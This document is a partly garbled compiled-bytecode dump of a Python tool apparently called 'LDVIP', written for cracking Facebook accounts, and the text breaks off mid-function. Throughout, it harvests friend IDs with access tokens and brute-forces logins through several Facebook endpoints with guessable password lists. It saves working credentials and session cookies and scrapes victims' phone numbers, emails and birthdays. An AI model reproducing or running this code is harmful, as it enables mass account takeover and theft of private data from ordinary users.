o
    jrzbǫ  �                   @   s�  d dl Z d dlZd dlZd dlZd dlZd dlZd dlZd dl Z d dlZd dlZd dlZd dl	Z	d dl
Z
zd dlZW n' eya   e �d� e	�d� zd dlZW n ey^   ed� Y nw Y nw d dlmZ d dlmZ d dlmZ d dlmZ d d	lmZ d d
lmZ d dlm Z! e d� e d� e d� e d� e d� e d� e d� e d� e d� e d� e d� e d� e d� e d� e d� e d� e d� e d� dd� Z"e"�  d dl#m$Z% d dl&m'Z( ze)dd��*� �+� Z,W n   g d�Z,Y ze)dd��*� �+� Z-W n   g d�Z-Y g g d d d g g g g g g g g f\Z.Z/a0a1a2Z3Z4Z5Z6Z7Z8Z9Z:dZ;dZ<dZ=dZ>dZ?dZ@dZAdZBdZCdZDdZEdZFd ZGd!ZHd"ZId#ZJdZKd$ZCd%Z=d$ZLd Z@d!ZMd!ZNd$ZBd%Z=d$ZLd ZGd!ZOd"ZPdZQdZRd!ZAd&ZSe�TeJeGeKeAeIg�ZUd'd(d)d*d+d,d-d.d/d0d1d2d3�ZVd'd(d)d*d+d,d-d.d/d0d1d2d4�ZWej�X� jYZZeVe[ej�X� j\� Z]ej�X� j^Z_d5e[eZ� d6 e[e]� d6 e[e_� d7 Z`d8e[eZ� d6 e[e]� d6 e[e_� d7 Zad9d:� Zbd;d<� Zcd=d>� Zdd?d@� ZedAdB� ZfdCdD� ZgdEdF� ZhdGdH� ZidIdJ� ZjdKdL� ZkdMdN� ZldOdP� ZmdQdR� ZndSdT� ZodUdV� ZpdWdX� ZqdYdZ� Zrd[d\� Zsd]d:� Zbd^d<� Zcd_d`� Ztdadb� Zudcdd� Zvdedf� Zwexdgk�rZe �dh� ze �ydi� W n   Y ze �ydj� W n   Y eg�  dS dS )k�    Nzpip install rich�   zKTidak Dapat Menginstall Module rich, Coba Install Manual (pip install rich))�Table)�Console)�BeautifulSoup)�ThreadPoolExecutor)�Group)�Panel)�printZLDVIPc                  C   s�   t t�� �t t�� � } d�| �}td| � z,t�d�j}||v r4td� t t�� �}t	�
d� W d S td� t	�
d� t��  W d S    t��  tdkrYtt� t�  Y d S Y d S )N�-z[37;1mYour ID : zhttps://justpaste.it/4t3oaz[92mYOUR ID IS ACTIVE.........r   zQ[91mBarezm Id kat active nya Tkaya bo Active krdn nama bnera bo telegram @FFRFF3�main)�str�os�geteuid�getlogin�joinr	   �requests�get�text�time�sleep�sys�exit�nameZlogo�chk)�uuid�idZhttpCaht�msg� r   �"/storage/emulated/0/Download/df.pyr   )   s&   


�r   )�Markdown)�Columnszuser.txt�r)z�Mozilla/5.0 (Linux; U; Android 2.3.4; pt-pt; SonyEricssonLT18a Build/4.0.1.A.0.266) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1z�Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; 9930i Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30z�Mozilla/5.0 (Linux; U; Android 2.3.4; ru-ru; MID Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1z�Mozilla/5.0 (Linux; U; Android 4.3; en-us; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30z�Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Fly IQ4404 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YandexSearch/7.16z	user2.txtz[mz[93mz[1;92mz[32mz[95mz[33mz[1;96mz[0;34mz[0;00mz[0;33mz[0mz[0;32mz[0;36mz[0;31mz[0;35mz[00mz[0;90mu   [•]ZJanuariZFebruariZMaretZAprilZMeiZJuniZJuliZAgustusZ	SeptemberZOktoberZNovemberZDesember)�1�2�3�4�5�6�7�8�9�10�11�12)�01�02�03�04�05�06�07�08�09r+   r,   r-   zOK-r
   z.txtzCP-c                 C   �2   | d D ]}t j�|� t j��  t�d� qd S �N�
g{�G�z�?�r   �stdout�write�flushr   r   ��z�er   r   r   �jalans   �   2rA   c                 C   r7   �Nr9   g���Q��?r:   r>   r   r   r   �mlakuu   rB   rD   c                   C   s   t �d� d S )N�clear)r   �systemr   r   r   r   rE   x   s   rE   c                   C   s
   t �  d S )N)�loginr   r   r   r   �backz   s   
rH   c                   C   s   t �  tdt � d S )Nu�  %s
	
 

[1;33m█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
[1;33m█  [mGithub:  LDVIP1
[1;33m█  [mFacebook: Alikr93
[1;33m█  [mtelegram: @FFRFF3
[1;33m█  [mTools :1.2 [1;33m
[1;33m█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█
)rE   r	   �hr   r   r   r   �banner|   s   

�rJ   c                  C   s�   zVt dd��� } t�| � zt�dtd  �}t�|j�d }t	|� W W d S  t
y4   t�  Y W d S  tjjyV   t�  d}t|dd�}t� j|d	d� t�  Y W d S w  tyc   t�  Y d S w )
N�
.token.txtr!   �+https://graph.facebook.com/me?access_token=r   r   z# KONEKSI INTERNET BERMASALAH�red��style�cyan)�open�read�tokenku�appendr   r   �json�loadsr   �menu�KeyError�login_kontol�
exceptions�ConnectionErrorrJ   �mark�solr	   r   �IOError)�token�syZsy2�li�lor   r   r   rG   �   s&   
��rG   c               	   C   s@  t �  tdt � tdt � tdt � ttd �} tdd��| �}z<t�d|  �}t	�
|j�d }tdt � td	t � td
ttttf � td	t � tdt � t�d� t�  W d S  ty�   tdt � tdttttf � t�d� t�  Y d S  tjjy�   d}t|dd�}t� j|dd� t�  Y d S w )N�_   %s ●▬▬▬▬▬▬▬▬▬▬▬▬๑🃏๑▬▬▬▬▬▬▬▬▬▬▬▬▬● z%s    [1;32m TOKEN FACEBOOK u   [1;96m•Token> rK   �wrL   r   z%s 
�w   %s ●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬๑🃏๑▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬● u*   %s╚══[%s✓%s] %s[1;96mLOGIN  TOOLSz-%s [1;96mJalan kan perintah python barus.py g      @u5   %s╚══[%s!%s] %sLOGIN GAGAL CEK AKUN TUMBAL ANDA�2# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI�yellowrN   rP   )rJ   r	   rI   �input�xrQ   r<   r   r   rU   rV   r   rA   �M�Pr   r   r   rX   rY   rZ   r[   r\   r]   )Zpanda�akun�tesZtes3ra   rb   r   r   r   rY   �   s6   

�rY   c                 C   s�   t �  ttd t| � � tdt � tdt � tdt � tdt � tdt � tdt � ttd �}|dv r@t�  d S |d	v rIt�  d S |d
v rRt�  d S |dv rqt	�
d� ttd � t�d� tdt � t�  d S tdt � t�  d S )Nz[m[~_~][96mNAMA  : [mrc   u    %s [m[01] [1;33mCRACK ID 🃏 z!%s [m[02] [1;33mopen old files z%s [m[03] [1;33mCEK OPSI CP z%s [m[00] [mLOG-OUTz[m[?] [1;96mChoose Number> �r"   r.   �r#   r/   �r$   r0   ��0Z00zrm -rf .token.txtu   [1;96m•Sabar Nunggu Ojek ...r   z"%s [1;33mSUKSES KELUAR CROTT AHH z+%s [1;33mNgajak gelud om pilih yang bener )rJ   r	   ri   r   rI   rh   �dump_massal�result�filer   rF   r   r   r   )Zmy_nameZjhr   r   r   rW   �   s.   






rW   c               	   C   s�  d} t � �t| dd�� d}t|dd�}tt|dd�� ttd t d	 t d
 �}|dv �r�zt�	d�}W n t
yS   d}t � �t|dd�� t�d� t�  Y nw t|�dkrpd}t � �t|dd�� t�d� t�  d S d}t � �t|dd�� d}i }	|D ]o}
ztd|
 d��� }W n   Y q�|d7 }|dk r�dt|� }|	�t|�t|
�i� |	�|t|
�i� td| d |
 d tt|�� d t � q�|	�t|�t|
�i� tdt|� d |
 d tt|�� d t � q�d}t � �t|dd�� ttd t d	 t d
 �}z|	| }W n t�y+   d}t � �t|dd�� t�  Y nw ztd| d��� }W n   d}t � �t|dd�� t�d� t�  Y d}t � �t|dd�� t�d | �}d}t � �t|dd�� ttd t d! t d" � t�  d S |d#v �r�zt�	d$�}W n t
�y�   d}t � �t|dd�� t�d� t�  Y nw t|�dk�r�d%}t � �t|dd�� t�d� t�  d S d&}t � �t|dd�� d}i }	|D ]s}
ztd'|
 d��� }W n   Y �q�|d7 }|d(k �r+dt|� }|	�t|�t|
�i� |	�|t|
�i� td| d |
 d tt|�� d t � �q�|	�t|�t|
�i� tdt|� d |
 d tt|�� d t � �q�d}t � �t|dd�� ttd t d	 t d
 �}z|	| }W n t�y�   d}t � �t|dd�� t�  Y nw ztd'| d��� }W n   d}t � �t|dd�� t�d� t�  Y d)}t � �t|dd�� t�d*| �}d)}t � �t|dd�� ttd t d! t d" � t�  d S |d+v �r�t�  d S d}t � �t|dd�� t�  d S ),Nz# CEK RESULT CRACK�greenrN   z8[01] Cek Hasil Cp
[02] Cek Hasil Ok
[00] Kembali Ke MenurP   ZRESULTS��title�[�f�
] Pilih : rn   �CPz# DIREKTORI TIDAK DITEMUKANrM   �   r   z# ANDA BELUM MEMILIKI RESULT CPrg   z# HASIL CP ANDA�CP/r!   r   �
   rr   �] � ---> � Akunz # PILIH RESULT UNTUK DITAMPILKAN�# PILIHAN TIDAK ADA DI MENU�+# FILE TIDAK DITEMUKAN, PERIKSA & COBA LAGIz# LIST AKUN CP ANDAzcd CP && cat �   •z	] Kembaliro   �OKz# ANDA BELUM MEMILIKI RESULT OKz# HASIL OK ANDA�OK/�d   z# LIST AKUN OK ANDAzcd OK && cat rq   )r]   r	   r\   �nel�cetakrh   ri   �pr   �listdir�FileNotFoundErrorr   r   rH   �lenrQ   �	readlinesr   �updaterX   r   rR   rF   rI   )�cekZkayesZkisZkzZvinZgadaZhahaZgerr�cih�lol�isi�hem�nomZgerr2�geeh�geh�ricZlin�heherl   ZhusZakun2r   r   r   rt   �   s�   


�


.2
�




�


04
�




rt   c                  C   s4  d} t � jt| dd�dd� ttd t d t d � t�d� d	}t � �t|d
d�� g }zt�d�}|D ]}|�	|� q7W n   Y zt�d�}|D ]}|�	|� qMW n   Y t
|�dkrrd}t � �t|dd�� t�  d S d}i }	|D ]�}
ztd|
 d��� }W n   ztd|
 d��� }W n   Y Y qxY |d7 }|dk r�dt|� }|	�t|�t|
�i� |	�|t|
�i� td| d |
 d tt
|�� d t � qx|	�t|�t|
�i� tdt|� d |
 d tt
|�� d t � qxd	}t � �t|d
d�� ttd t d t d �}z|	| }W n t�y2   d}t � �t|dd�� t�  Y nw ztd| d��� }|D ]}t�	|�dd�� �q?t�  W d S  t�y�   ztd| d��� }|D ]}t�	|�dd�� �qet�  W Y d S  t�y�   d}t � �t|dd�� t�d� t�  Y Y d S w w )Nz# CEK OPSI DARI FILErP   rN   zon redry   r�   z*] Sedang Membaca File, Tunggu Sebentar ...r}   z# PILIH FILE YG AKAN DI CEKrv   z	CP KONTOLr�   r   z(# ANDA BELUM MEMILIKI RESULT UNTUK DICEKrM   r~   r!   r�   r   r   rr   r�   r�   r�   rz   r{   r�   r9   � r�   )r]   r	   r\   ri   rI   r   r   r   r�   rT   r�   r   rQ   r�   r   r�   rh   r�   rX   rl   �replace�cek_opsir^   rH   )ZtekZteksZmy_filesZlisZktZmer�ty�yyr�   r�   r�   r�   r�   Zteks2r�   r�   r�   ZhfZfzr�   r   r   r   ru   E  s�   

�
�
�.2
�
��ru   c               
   C   s�  t �  t�  tdt � tdt � ttd � z
tttd ��} W n ty<   d}t|dd�}t	� �|� t
�  Y nw | dk sE| d	krVd
}t|dd�}t	� �|� t
�  t�� }d}t| �D ]}|d7 }ttd t|� d �}t�|� q`tD ]_}z5|�d| d td  ��� }|d d D ]}	z|	d d |	d  }
|
tv r�nt�|
� W q�   Y q�W qz ttfy�   Y qz tjjy�   d}t|dd�}t	� j|dd� t
�  Y qzw dtt� }tt�dkr�t|dd�}nt|dd�}t	� �|� t�  d S )Nz%%s  [m[~_~][1;32mCRACK  ID [m[~_~]u}   %s ●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬๑🃏๑▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬● z6[m[ ! ] [1;96mMASUKKAN JUMLAH ID CRACK [ limit 100 ]z&[m[ ? ] [1;96mMAU CRACK BERAPA ID ? z&# INPUT YANG ANDA MASUKKAN BUKAN ANGKArg   rN   r   r�   z## MASUKAN JUMLAH ID OM BUKAN ID NYAr   u!   [m[ ? ] [1;96m•MASUKAN ID KE z : zhttps://graph.facebook.com/z)?fields=friends.limit(5000)&access_token=Zfriends�datar   �|r   rf   rM   rP   z# BERHASIL DUMP %s ID )rE   rJ   r	   rI   ri   �intrh   �
ValueErrorr\   r]   r   r   �Session�ranger   �uidrT   r   rS   rU   r   rX   r^   rZ   r[   r�   �setting)ZjumZpesanZpesan2�sesZyzZmet�klZuserr�col�miZisora   rb   ZtotZtot2r   r   r   rs   �  sb   
�

�
�
�
rs   c                  C   sx  t dt � t dt � t dt � t dt � ttd �} | dv r-tD ]}t�|� q$n| dv r=tD ]}t�d|� q3n	t dt � t�  t dt � t d	t � t d
t � t dt � t dt � ttd �}|dv rtt	�d� n|dv r~t	�d� n	|dv r�t	�d� t dt � ttd �}|dv r�t
�d� nt
�d� ttd �}|dv r�t�d� nt�d� t�  d S )Nre   z%s [m[01] [1;32mAKUN TERTUAz%s [m[02] [1;32mAKUN TERMUDA z[m[ ? ] [1;96mInput Number: rn   ro   r   z#%s [1;33mPilihan Tidak Ada Di Menuu   %s [1;32m[01] B-API🆔🔄 u   %s [1;32m[02] WIFE🚫📶u   %s [1;32m[03] MBASIC 📶 u"   [m[ ? ] [1;96m•Input Number>  �crack2�crackrp   �crack3rc   u1   [m[ ? ] [1;32m•Show connected apps ? (y/t):  ��y�Y�ya�nou1   [m[ ? ] [1;33m•Show connected apps ? (y/t):  )r	   rI   rh   ri   r   �id2rT   �insertr   �method�	taplikasi�oprek�passwrd)�huZbacotZhcZaplikZoskr   r   r   r�   �  sJ   ��



r�   c                  C   s�  t �  t�  tdt � tdtttf � tdt � tdd���} tD ]�}|�d�d |�d�d �	� }}|�d�d }g d	�}t
|�d
k rdt
|�dk rNn<|�|d � |�|d � |�|d � n&t
|�dk rp|�|� n|�|� |�|d � |�|d � |�|d � dtv r�| �t||� q#dtv r�| �t||� q#dtv r�| �t||� q#| �t||� q#W d   � n1 s�w   Y  td� tdt � ttd �}|dv r�t�  d S t�  d S )Nu�   %s ●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬๑🃏๑▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬● u�   %s[m•Hasil OK  Disimpan Ke : OK/%s
[m•Hasil CP Disimpan Ke : CP/%s
[m•TRUN ON/OF MODE PESAWAT SETIAP 500 Id
[1;33m•SAMBIL NUNGGU PROSES CRACK
[1;33m•DI SARANKAN COLI OM�   )Zmax_workersr�   r   r   � )Z
1122334455Z
1234512345Z19901990Z19991999Z20002000Z20012001Z20022002Z19981998Z19971997Z19961996Z19951995Z19941994�   �   Z123Z12346Z12345Zmobile�api�freer�   rc   u6   [1;96m•Ingin Menampilkan Opsi Hasil Crack? (y/t) : r�   )rE   rJ   r	   rI   �okc�cpc�tredr�   �split�lowerr�   rT   r�   �submitr�   r�   r�   rh   ri   r�   r   )�poolZyuzong�idfZnmfZfrs�pwvZwoir   r   r   r�   �  sJ   "
��

r�   c           *      C   s�  t �ttttttg�}td t	t
� }d}td|tt	t
�ttt|�t|�tf dd� tj��  t �t�}t �t�}t�� }|D �]�}�z�t�� }	|j�dd|ddd	d
ddddddd�� |�d�j}
t�dt|
���d�t�dt|
���d�| d|dd�}|j�ddddd|dd	d
ddddddd�� |j d|dd�}d |j!�"� �#� v r�d!t$v r�t%�&| d" | � t'| |� ntd#� td$| � d%|� d#�� td7 aW  �nd&|j!�"� �#� v �r�d'd(i}d)t(v �r!td7 a|j!�"� }d*�)d+d,� |j!�"� �*� D ��}t+d-t, d.��-| d" | d" | d# � td#� td/| � d0|� d#�� W  �n�d!t(v �r�td7 a|j!�"� }d*�)d1d,� |j!�"� �*� D ��}t+d-t, d.��-| d" | d" | d# � | }d2}t�� }|jd3||d4�j}t�.d5t|��d6 }|jd7||d4�j}|jd8||d4�j}|jd|� d9�||d4�j}|jd:|� d;�||d4�j}zt�.d<t|��d6 }W n   d2}Y zt�.d=t|��d6 �/d>d?�}W n   d2}Y zt�.d@t|��d6 }W n   d2}Y zt�.dAt|��d6 }W n   d2}Y zt�.dBtt0��d }W n   d2}Y zd2}t�.dCt|��}|D ]	} || dD 7 }�q	W n   Y dE\}!}"|jdF||d4�j}#|jdG||d4�j}$dHt�.d5t|#��v �r�|dI7 }dJ|#v �rH|dK7 }n2|dL7 }t�.dMt|#��}%t�.dNt|#��}&|%D ]}'|!d7 }!|dO|!� dP|'� d|&|" � d#�7 }|"d7 }"�q^dQ|$v �r�|dR7 }n8dE\}!}"|dS7 }t�.dMt|$��}(t�.dNt|$��})|(D ]}'|!d7 }!|dO|!� dP|'� d|)|" � d#�7 }|"d7 }"�q�n	 td#� td/| � d0|� d#�� t1|� W  nnW q@W q@ tj2j3�y�   t�4dT� Y q@w td7 ad S )UNr�   �%z4%s [LDVIP] %s/%s ~_~ [OK:%s] ^_^ [CP:%s] ~_~ %s%s%sr�   ��endzm.facebook.comr"   ��text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9�mark.via.gp�same-origin�cors�empty�document�https://m.facebook.com/�gzip, deflate br�en-GB,en-US;q=0.9,en;q=0.8��Host�upgrade-insecure-requests�
user-agent�acceptZdnt�x-requested-with�sec-fetch-site�sec-fetch-mode�sec-fetch-user�sec-fetch-dest�referer�accept-encoding�accept-language�lhttps://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F�name="lsd" value="(.*?)"r   �name="jazoest" value="(.*?)"�login_no_pin�8https://developers.facebook.com/tools/debug/accesstoken/�Zlsd�jazoestr�   Zflow�pass�next�	max-age=0�https://m.facebook.com�!application/x-www-form-urlencoded�r�   zcache-controlr�   �origin�content-typer�   r�   r�   r�   r�   r�   r�   r�   r�   r�   zChttps://m.facebook.com/login/device-based/validate-password/?shbl=0F�r�   �allow_redirects�
checkpointr�   r�   r9   �   [1;33m╚══[CP][1;33m�   [m•[1;33m�c_userr�   �wMozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.76 Safari/537.36r�   �;c                 S   �   g | ]
\}}d ||f �qS �z%s=%sr   ��.0�key�valuer   r   r   �
<listcomp>*  �    zcrack.<locals>.<listcomp>r�   �a�   [1;32m╚══[OK][1;96m�   [m•[1;96mc                 S   r�   r�   r   r�   r   r   r   r   2  r  r�   �"https://m.facebook.com/profile.php)�cookies�headers�\<title\>(.*?)<\/title\>r   �)https://m.facebook.com/profile.php?v=info�,https://m.facebook.com/profile.php?v=friends��/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_�Ahttps://m.facebook.com/timeline/app_collection/?collection_token=�#%3A184985071538002%3A32&_rdc=1&_rdr�=\<a\ href\="tel\:\+.*?">\<span\ dir\="ltr">(.*?)<\/span><\/a>�W\<a href\="https\:\/\/lm\.facebook\.com\/l\.php\?u\=mail.*?" target\=".*?"\>(.*?)<\/a\>�&#064;�@�h\<\/td\>\<td\ valign\="top" class\=".*?"\>\<div\ class\=".*?"\>(\d+\s+\w+\s+\d+)<\/div\>\<\/td\>\<\/tr\>�+\<h3\ class\=".*?"\>Teman\ \((.*?)\)<\/h3\>�%\<span\ class\=".*?"\>(.*?)\<\/span\>�%\<div\ class\=".*?" id\="year_(.*?)">�, �r   r   �7https://m.facebook.com/settings/apps/tabbed/?tab=active�9https://m.facebook.com/settings/apps/tabbed/?tab=inactive�Diakses menggunakan Facebook�Aplikasi Yang Terkait*
�AAnda tidak memiliki aplikasi atau situs web aktif untuk ditinjau.�(Tidak Ada Aplikasi Aktif Yang Terkait *
�	Aplikasi Aktif : 
�;\/><div\ class\=".*?"\>\<span\ class\=".*?"\>(.*?)<\/span\>�2\<div\>\<\/div\>\<div\ class\=".*?"\>(.*?)<\/div\>�		[r�   �FAnda tidak memiliki aplikasi atau situs web kedaluwarsa untuk ditinjau�-
Tidak Ada Aplikasi Kedaluwarsa Yang Terkait
�	Aplikasi Kedaluwarsa :
�   )5�random�choice�u�k�kk�brI   �hh�loopr�   r�   r	   �ok�cpr�   r   ri   r   r;   r=   �ugen�ugen2r   r�   r   r  r�   r   r   �re�search�group�postr  �get_dict�keysr�   rl   rT   �cekerr�   r   �itemsrQ   r�   r<   �findallr�   �	response4�cek_apkrZ   r[   r   )*r�   r�   �bi�pers�fff�ua�ua2r�   �pwZtixr�   �dataa�poZheadapp�coki�kuki�user�infoakun�session�get_id�nama�response�	response2�	response3Zresponscee4�nomer�email�ttl�teman�pengikut�tahun�cek_thn�nenen�hit1�hit2r�   �cek2�apkAktif�ditambahkan�muncul�apkKadaluarsa�
kadaluarsar   r   r   r�     s�   6


(6,

(

("�

 

 ��A�B�r�   c           
   
   C   s�  t �ttttttg�}td t	t
� }d}td|tt	t
�ttt|�t|�tf dd� tj��  t �t��dd�}t�� }|D ]�}z�tt �dd	��tt �d
d��tt �d
d��dd|ddd�}|jdt| � d t|� d |d�}	d|	�� d v r�dtv r�t�| d | � t| |� n&tdt| |f � tdt  d��!| d | d � t�| d | � td7 aW  n<d|	j"v r�d|	j"v r�tdt| |f � td t# d��!| d | d � td7 aW  nW q? tj$j%y�   t&�'d!� Y q?w td7 ad S )"Nr�   r�   z/%s [Libya] %s/%s ~_~ [OK*%s | CP*%s ~_~ %s%s%sr�   r�   r9   r�   g    �sAg    8�|Ai N  i@�  Z	EXCELLENTz!cell.CTRadioAccessTechnologyHSDPAr�   ZLiger)zx-fb-connection-bandwidthzx-fb-sim-hnizx-fb-net-hnizx-fb-connection-qualityzx-fb-connection-typer�   r�   zx-fb-http-enginez?https://b-api.facebook.com/method/auth.login?format=json&email=z
&password=a�  &credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true�r  zwww.facebook.comZ	error_msgr�   r�   z%s++++ %s|%s ----> CP       r~   r  r   Zsession_keyZEAABz%s++++ %s|%s ----> OK       r�   r%  )(r&  r'  r(  r)  r*  r+  rI   r,  r-  r�   r�   r	   r.  r/  r�   r   ri   r   r;   r=   r0  r�   r   r�   �randintr   rU   r�   rl   rT   r8  rQ   r�   r<   r   r�   rZ   r[   r   r   )
r�   r�   r=  r>  r?  r@  r�   rB  �head�respr   r   r   r�   u  s:   6:&  �r�   c           (      C   s�  t �ttttttg�}td t	t
� }d}td|tt	t
�ttt|�t|�tf dd� tj��  t �t�}t �t�}t�� }|D �]�}�z�|j�dd|ddd	d
ddddddd�� |�d�j}	t�dt|	���d�t�dt|	���d�| d|dd�}
|j�ddddd|dd	d
ddddddd�� |jd|
dd �}d!|j �!� �"� v r�d"t#v r�t$�%| d# | � t&| |� n,td$� td%| � d&|� d$�� t'd't( d(��)| d# | d$ � t$�%| d# | � td7 aW  �nd)|j �!� �"� v �r�d*t*v �r2td7 a|j �!� }d+�+d,d-� |j �!� �,� D ��}t'd.t- d(��)| d# | d# | d$ � td$� td/| � d0|� d$�� W  �n�d"t*v �r�td7 a|j �!� }d+�+d1d-� |j �!� �,� D ��}t'd.t- d(��)| d# | d# | d$ � | }d2}t�� }|jd3|d4�j}t�.d5t|��d6 }|jd7|d4�j}|jd8|d4�j}|jd9|� d:�|d4�j}|jd;|� d<�|d4�j}zt�.d=t|��d6 }W n   d2}Y zt�.d>t|��d6 �/d?d@�}W n   d2}Y zt�.dAt|��d6 }W n   d2}Y zt�.dBt|��d6 }W n   d2}Y zt�.dCt|��d }W n   d2}Y zd2}t�.dDt|��}|D ]	}||dE 7 }�qW n   Y dF\}} |jdG|d4�j}!|jdH|d4�j}"dIt�.d5t|!��v �r�|dJ7 }dK|!v �rR|dL7 }n2|dM7 }t�.dNt|!��}#t�.dOt|!��}$|#D ]}%|d7 }|dP|� dQ|%� d|$|  � d$�7 }| d7 } �qhdR|"v �r�|dS7 }n8dF\}} |dT7 }t�.dNt|"��}&t�.dOt|"��}'|&D ]}%|d7 }|dP|� dQ|%� d|'|  � d$�7 }| d7 } �q�n	 td$� td/| � d0|� d$�� t0|� W  nnW q@W q@ tj1j2�y�   t3�4dU� Y q@w td7 ad S )VNr�   r�   z0%s [LDVIP] %s/%s ~_~ [OK:%s | CP:%s] ~_~ %s%s%sr�   r�   zmbaisc.facebook.comr"   r�   r�   r�   r�   r�   r�   zhttps://mbaisc.facebook.com/r�   r�   r�   zqhttps://mbaisc.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2Fr�   r   r�   r�   r�   r�   r�   r�   r�   r�   r�   zHhttps://mbaisc.facebook.com/login/device-based/validate-password/?shbl=0Fr�   r�   r�   r�   r9   r�   r�   r~   r  r�   r�   r�   c                 S   r�   r�   r   r�   r   r   r   r   �  r  zcrack3.<locals>.<listcomp>r�   r  r  c                 S   r�   r�   r   r�   r   r   r   r   �  r  r�   r  �r  r  r   r	  r
  r�   r  r  r  r  r  r  r  r  r  r  r  r  r  r  r  r  r  r  r  r  r  r   r!  r�   r"  r#  r$  r%  )5r&  r'  r(  r)  r*  r+  rI   r,  r-  r�   r�   r	   r.  r/  r�   r   ri   r   r;   r=   r0  r1  r   r�   r  r�   r   r   r2  r3  r4  r5  r  r6  r7  r�   rl   rT   r8  rQ   r�   r<   r�   r   r9  r�   r:  r�   r<  rZ   r[   r   r   )(r�   r�   r=  r>  r?  r@  rA  r�   rB  r�   rC  rD  rE  rF  rG  rH  rI  rJ  rK  rL  rM  rN  r;  rO  rP  rQ  rR  rS  rT  rU  rV  rW  rX  r�   rY  rZ  r[  r\  r]  r^  r   r   r   r�   �  s�   6


(6, 

(

("�

 

 ��@�A�r�   c                 C   s�  d}ddddd|ddd	d
dddddd�}t �� }z�|�d�}t|jd| |dd�|dd�jd�}|�d�}i }g d�}	|d�D ]}
|
�d�|	v rT|�|
�d�|
�d�i� q>t|jdt|d � ||d�jd�}t	dt
| |tf � tdt d ��| d! | d" � td#7 a|�d$�}t|�d%kr�t	d&ttf � W d S |D ]}t	d't|jtf � q�W d S  ty� } z-t	dt
| |tf � t	d(ttf � tdt d ��| d! | d" � td#7 aW Y d }~d S d }~ww ))Nr�   �mbasic.facebook.comr�   r"   �https://mbasic.facebook.comr�   �|text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9r�   r�   �navigate�?1r�   �:https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8�gzip, deflate�#id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7r�   �%https://mbasic.facebook.com/login.phpr�   �rP  r�   rG   T�r�   r  r�   �html.parser�form�Znhr�   Zfb_dtsgzsubmit[Continue]Zcheckpoint_datarh   r   r�   �action�r�   r  �%s++++ %s|%s ----> CP       %sr~   r  r�   r9   r   �optionr   �2%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)�%s---> %s%sz>%s---> Tidak Dapat Mengecek Opsi (Cek Login Di Lite/Mbasic)%s)r   r�   r   �parserr5  r   �findr�   r   r	   r+  ri   rQ   r�   r<   r/  �find_allr�   r,  r*  �	Exceptionr(  )r�   rB  r@  ra  r�   �hi�ho�jor�   �lion�anj�kent�opsi�opsii�cr   r   r   r8     s<   $
"
�$ 
� ��r8  c                  C   s$  t t�} d|  }tt|dd�� ttd t d t d � d}t� �t	|dd	�� d
}tD �]Q}�z/z|�
d�d
 |�
d�d }}W n  tyd   t�d� tdt|tf � tdttf � Y W q.w t�ttttttg�}td||t t�|tf dd� tj��  d}t�� }	ddddd|dddddddd d!d"�}
|	�d�}t|	jd#||d$d%�|
d&d'�jd(�}d)|	j�� � � v �r=zi|�!d*�}i }g d+�}|d,�D ]}|�d-�|v r�|�"|�d-�|�d.�i� q�t|	jdt#|d/ � ||
d0�jd(�}td1t||tf � |�$d2�}t |�d
k�rtd3ttf � n|D ]}td4t|jtf � �qW n6   td1t||tf � td5ttf � Y nd6|	j�� � � v �rRtd7t||tf � n
td8t||tf � |d7 }W q. tj%j&�y�   td9� d:}t� �t	|d;d	�� t'�  Y q.w d<}t� �t	|dd	�� t'�  d S )=NzWTerdapat %s Akun Untuk Dicek
